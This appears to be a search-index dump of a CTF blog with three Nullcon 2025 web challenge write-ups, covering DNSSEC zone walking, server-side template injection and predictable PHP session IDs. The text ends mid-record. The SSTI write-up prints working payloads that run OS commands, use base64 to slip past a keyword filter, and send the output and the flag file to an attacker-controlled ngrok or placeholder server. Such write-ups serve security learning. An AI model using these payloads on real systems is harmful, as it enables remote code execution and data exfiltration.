[{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'ZONEy' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:0:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 39 solve rate 📅 Date 02-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By jsnv Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:1:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information Are you ZONEy.eno out or can you find the flag? 52.59.124.14:5007 (UDP) ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:2:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:3:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:3:1","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps The challenge provides: 52.59.124.14:5007 (UDP) Doing an nmap scan, I discovered that there is a DNS (Domain Name System) server on port 5007, so I used dig (a DNS lookup tool) on the specified IP and port. Since the name of the challenge itself, ZONEy, is somewhat reminiscent of zone (zone transfer in DNS), I thought it could be related to that: dig @52.59.124.14 -p 5007 MX zoney.eno +short This command looks for the Mail Exchange (MX) record for zoney.eno. The result: 10 challenge.zoney.eno. The result suggests that challenge.zoney.eno is a domain to explore further. So, searching online, I found the DNSSEC NSEC Walking vulnerability, which is used to enumerate subdomains of a network by making requests to the DNS server. DNSSEC (Domain Name System Security Extensions) is an extension of DNS that provides authenticity and integrity to DNS records, preventing attacks like DNS Spoofing. DNSSEC introduces new records such as RRSIG, NSEC, and DS to ensure the validity of DNS responses. NSEC (Next Secure Record) is used to demonstrate that a certain domain does not exist. An NSEC record lists the next domain in the DNS database, creating an ordered chain of records. If an attacker queries a non-existent domain, the DNS server responds with an NSEC record, revealing the next valid domain in the zone. Continuing in this way, I might be able to trace the domain where the flag is located. ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:4:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:5:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities DNSSEC NSEC Walking 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:5:1","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:6:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup The next step was to query the new domain obtained from the previous dig command (10 challenge.zoney.eno.). Once I did that, I continued iterating until I reached the final domain, thus enumerating all the domains. ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:6:1","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation The exploitation is literally the process described above. As we can see from the image, I was able to find hereisthe1377flag.zoney.eno, where the flag was contained in the TXT (Text) field of the domain. Another way to achieve all of this is by using dnsrecon, a tool used for reconnaissance and subdomain enumeration. ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:6:2","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag 🚩 Flag Capture Flag ENO{1337_FL4G_NSeC_W4LK3R} ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:6:3","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Manual Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose dig DNS Enumeration 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:7:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"New Knowledge I learned what DNSSEC NSEC Walking is and how to enumerate subdomains of a DNS. ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:8:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:9:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Learning Resources https://www.domaintools.com/resources/blog/zone-walking-zone-enumeration-via-dnssec-nsec-records/ https://hackerone.com/reports/228471 📊 Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking (At the time of flag submission) 11/1115 Challenge ranking Points Earned 500 Team contribution Created: 02-02-2025 • Last Modified: 02-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/zoney/:10:0","tags":["🚶 DNSSEC NSEC Walking","🌐 Web Security"],"title":"🌐 ZONEy","uri":"/posts/2025/02/07/zoney/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Temptation' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:0:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟡 Medium Personal Rating: 5/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 83 solve rate 📅 Date 01-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:1:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information The attempted attempt to tempt the untempted into a tempting but contemptible scheme was an untempting temptation that exemplified not only contempt but also a preemptive exemption from any redemptive attempts. http://52.59.124.14:5011 ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:2:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:3:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:3:1","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Inspecting the page source: Source Page I found the route /?source, which was supposed to show me the server-side source code: Source Path But when visiting it, I received the same page as before from /. So, I tried passing the parameter /?source=0 and got the source code: Source Code Indeed, as we can see from the source code, any GET request with the parameter /?source=something returns the source code of the page. It’s also possible to make a POST request to the page passing a temptation parameter. If the temptation parameter contains flag or FLAG (and so on), since everything is converted to lowercase, an error message is returned. It then checks if the parameter we send equals FLAG, and if so, it returns the actual flag. Initially, I thought of some kind of character escape or encoding to bypass the first check and reach the second one to pass it. As the first step, I copied the source and created a file  app.py. I added a couple of print statements for debugging purposes to understand how everything works. It had dependencies, so I installed web.py and then started the app locally: pip install web.py python3 app.py App Execution Next, I started making test requests using curl to test for a potential template injection with the parameter temptation=\\${injection}: curl -X POST \"http://0.0.0.0:8080/\" --data-urlencode \"temptation=\\${chr(70)+chr(76)+chr(65)+chr(71)}\" I tried to bypass the check by sending flag composed of the conversion from decimal to text (ASCII) using Python’s chr() function, since through the template injection I was able to execute Python. As we can see, once I send the request, it halts at the last if statement, which checks str(temptation) == \"FLAG\". Curl 1 With the debug prints I previously added to the code, I understood why it wasn’t working. As we can see, it evaluates \"Your temptation is: FLAG\" == \"FLAG\", and of course, this condition will never be true. So, I thought of using escape characters, also converted from decimal to ASCII using the chr() function. Invisible characters should not be recognized by the server. The first thing I tried to send was temptation=\\${chr(0)+chr(70)+chr(76)+chr(65)+chr(71)}, where I added chr(0), which represents the \\x00 (null character) string terminator, so it would stop before FLAG and only insert FLAG into the temptation variable. However, this didn’t work. The second thing I tried was sending backspace characters, i.e., the character used to erase on a keyboard. By sending chr(8) (the backspace character in ASCII) before the characters forming the word FLAG, it would erase the unwanted part (Your temptation is: ), bypassing the check and allowing the correct flag to pass. curl -X POST \"http://0.0.0.0:8080/\" --data-urlencode \"temptation=\\${chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(70)+chr(76)+chr(65)+chr(71)}\" Curl 2 As we can see, however, the backspace character did not actually erase the text; instead, it literally replaced the text (much like in Vim’s REPLACE mode). So, after trying a sequence of characters that would erase the line, and experimenting with other approaches, I realized that it wasn’t the right path. I then tried to execute a command locally, such as id, using Python’s os module: curl -X POST \"http://0.0.0.0:8080/\" --data-urlencode \"temptation=\\${__import__('os').popen('id').read()}\" Curl 3 As we can see, the command actually gets executed, but in the end, it hits the last if statement and doesn’t return the flag because it fails the check. From there, I attempted to get a reverse shell via netcat, but obviously, it would have to be installed on the server, and I wasn’t sure about that. I then thought of using the classic reverse shell with /dev/tcp in Bash to establish a TCP connection, but that didn’t work either. So, I found my own way around it. Let’s move on to the exploitation. ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:4:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:5:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities SSTI (Server Side Template Injection) 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:5:1","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:6:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup My idea was to redirect the contents of /tmp/flag.txt to my own web server by sending the flag in a request parameter. So the first thing I did was start a web server: ngrok http 8080 Once I started the web server, I first tried with a local request by directing curl to my own server, exploiting the SSTI vulnerability. curl -X POST \"http://0.0.0.0:8080/\" --data-urlencode \"temptation=\\${__import__('os').popen('curl https://c590-2-37-206-147.ngrok-free.app').read()}\" Curl 4 As we can see, the request arrives on ngrok. Now, it needs to be tested if the same happens when performing this process on the challenge server, not locally (since curl needs to be installed on the web server to make requests). curl -X POST \"http://52.59.124.14:5011/\" --data-urlencode \"temptation=\\${__import__('os').popen('curl https://c590-2-37-206-147.ngrok-free.app').read()}\" Curl 5 As we can see, it works, and curl is correctly installed on the web server. This allows us to redirect the request to our server. After a few tests locally, I was able to get the response of the id command execution from the remote challenge web server to my web server created with ngrok. curl -X POST \"http://52.59.124.14:5011/\" --data-urlencode \"temptation=\\${__import__('os').popen('curl https://c590-2-37-206-147.ngrok-free.app?content=\\$(id)').read()}\" Using $(command) in bash allows executing commands and printing the output inside strings. This is the result: Curl 6 As we can see, I obtain the response on my web server, but let’s check if the output of the id command executed on the web server is in the content request parameter. This can be done through the ngrok web interface at http://127.0.0.1:4040. 'id' Execution As we can see from the last request, the content parameter contains the value uid=999(appuser), which is the user ID with which we executed the command. So it works! Now, we just need to proceed with the actual exploitation and read the /tmp/flag.txt file. ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:6:1","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation For the exploitation, we can’t send a direct request with cat /tmp/flag.txt because the server blocks the request before reaching the template injection part if it finds flag in the request. So, I thought of encoding the command in base64: echo \"cat /tmp/flag.txt\" | base64 Base64 Encode Once the command is encoded, we can use a simple bash trick, the pipe |, to concatenate commands and execute the base64-decoded command on bash itself. We can do this by running echo Y2F0IC90bXAvZmxhZy50eHQK | base64 -d | bash. As we can see, this command executes cat /tmp/flag.txt: Cat Flag Once that’s done, since we are sending a base64-encoded string in the request, the check won’t block it because \"Y2F0IC90bXAvZmxhZy50eHQK\" != \"flag\". However, once it reaches the web server, the actual command will be executed. I then construct the complete request with curl: curl -X POST \"http://52.59.124.14:5011/\" --data-urlencode \"temptation=\\${__import__('os').popen('curl https://9791-2-37-206-147.ngrok-free.app?content=\\$(echo Y2F0IC90bXAvZmxhZy50eHQK| base64 -d |bash)').read()}\" Exploitation And as we can see, the request reaches the ngrok web server. Now, we just need to check on the ngrok web interface to see if the output of the cat /tmp/flag.txt command (i.e., the actual flag) is in the content parameter. Another valid and much more elegant exploit, after speaking with a guy from my team, is the following: curl http://52.59.124.14:5011/ --data \"temptation=\\${__import__('os').popen('curl -X POST https://your-server.com --data-binary @/etc/flag.txt').read()}\" ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:6:2","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag (The flag does not display the {} brackets due to an encoding or decoding issue with ngrok. You just need to add one bracket at the end and one after ENO to recreate the flag pattern and have a valid flag.) 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:6:3","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The exploit I created is fully automated and performs the procedure described above. However, there are some prerequisites. First, ngrok needs to be started: ngrok http 4444 If necessary, the port in exploit.py should be changed to match the tunneling port of ngrok. After starting ngrok, take the tunneling link provided by ngrok and replace the link in the request.py script. At this point, you just need to run the exploit first, followed by the request, either in separate terminals or on the same terminal, possibly using tmux. python exploit.py python request.py exploit.py is a Python web server that runs locally, and with ngrok tunneling, it forwards the port. So once the request with the payload is sent, the response will first go to ngrok and then to the local Python server. Upon receiving the request, I extract the content parameter, format the flag by adding {} as mentioned earlier, and then print it:  Exploit  Request 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:7:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit Ngrok Tunneling 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:8:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"New Knowledge I learned to exploit SSTI by passing a command and returning the output to my ngrok webserver. ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:9:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 01:30 From start to flag Global Ranking (At the time of flag submission) 26/970 Challenge ranking Points Earned 500 Team contribution Created: 01-02-2025 • Last Modified: 01-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/temptation/:10:0","tags":["💉 SSTI (Server Side Template Injection)","🌐 Web Security"],"title":"🌐 Temptation","uri":"/posts/2025/02/07/temptation/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Sess.io' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:0:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟡 Medium Personal Rating: 5/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 75 solve rate 📅 Date 02-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:1:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information Long sessions must be secure, right? http://52.59.124.14:5008 ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:2:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:3:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:3:1","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Taking a look at the source: Source Code I understood that the presented PHP code has a vulnerability related to predictable session IDs: define(\"ALPHA\", str_split(\"abcdefghijklmnopqrstuvwxyz0123456789_-\")); ini_set(\"error_reporting\", 0); ALPHA: An array of possible characters used to build the session ID. Disable errors to prevent giving attackers any information. include \"flag.php\"; // $FLAG $SEEDS = str_split($FLAG, 4); The file flag.php contains the flag (e.g., $FLAG = \"ENO{...}\"). *$SEEDS is an array of substrings of the flag, each 4 characters long: function session_id_secure($id) { global $SEEDS; mt_srand(intval(bin2hex($SEEDS[md5($id)[0] % (count($SEEDS))]), 16)); $id = \"\"; for($i = 0; $i \u003c 1000; $i++) { $id .= ALPHA[mt_rand(0, count(ALPHA) - 1)]; } return $id; } This function generates a custom session ID: Calculates the seed for the Mersenne Twister random number generator (MT) based on the first character of the MD5 hash of the combined input of username and password. Regenerates the session ID of 1000 characters using the characters defined in ALPHA. The main vulnerability lies in the fact that the session ID is predictable if we know the flag segments (seed) used to initialize mt_rand. Since the seed is derived from segments of the flag, it is possible to determine the flag itself by understanding the behavior of the Mersenne Twister generator. if (isset($_POST['username']) \u0026\u0026 isset($_POST['password'])) { session_id(session_id_secure($_POST['username'] . $_POST['password'])); session_start(); echo \"Thank you for signing up!\"; } else { echo \"Please provide the necessary data!\"; } If the username and password are provided, a PHPSESSID is generated based on them. This allows an attacker to register multiple sessions and observe the generated session ID to deduce the seed. So, to summarize: Using mt_rand to generate sessions: Mersenne Twister is fast but not secure for cryptographic operations. Seed derived from flag segments: This allows using php_mt_seed to predict the seed and, consequently, deduce the flag. Predictability of the seed: Since the seed is calculated using a part of the flag (four characters at a time), it’s possible to iteratively decode the entire flag (once we have the first 4 characters, we know the flag starts with ENO{, which gives us the format of the flag). Searching online, I found a tool for cracking the seed: (https://www.openwall.com/php_mt_seed/). Now that we have all this information, we can move on to the exploitation. ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:4:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:5:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities Predictable Session ID Vulnerability 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:5:1","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:6:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup The exploitation is divided into four phases: Multiple Registration: Register usernames with random combinations of username and password. Session ID Retrieval: Observe the PHPSESSID value assigned by the server. Using php_mt_seed: Use php_mt_seed to find the seed used and trace back to the part of the flag that generated it. Iterate on the Flag: Repeat the process to reconstruct the full flag. ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:6:1","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation To perform the above-described procedure, I wrote an exploit in Python, which uses: php_mt_seed.c To crack the seed and extract parts of the flag one by one. Once the seed is deduced, we can proceed with reconstructing the flag. ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:6:2","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Automated Flag 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:6:3","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The automated exploit literally follows the process described above: cd php_mt_seed-4.0 make python exploit.py  Exploit php_mt_seed 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:7:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical 